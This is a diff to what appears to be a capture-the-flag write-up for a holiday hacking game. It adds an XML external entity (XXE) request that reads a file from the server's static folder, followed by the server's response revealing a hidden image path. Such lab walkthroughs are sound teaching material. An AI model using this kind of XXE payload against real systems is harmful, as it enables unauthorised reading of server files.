@@ -297,3 +297,22 @@ Accept-Encoding: gzip, deflate
   "visit": "none"
 }
 ```
+- In the browser we can also see the silver ring let's try it.
+- silverring.txt (Request):
+```xml
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt"> ]>
+<root>
+  <imgDrop>&xxe;</imgDrop>
+  <who>princess</who>
+  <reqType>xml</reqType>
+</root>
+```
+- silverring.txt (Response):
+```json
+{
+  "appResp": "I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!",
+  "droppedOn": "none",
+  "visit": "static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px"
+}
+```
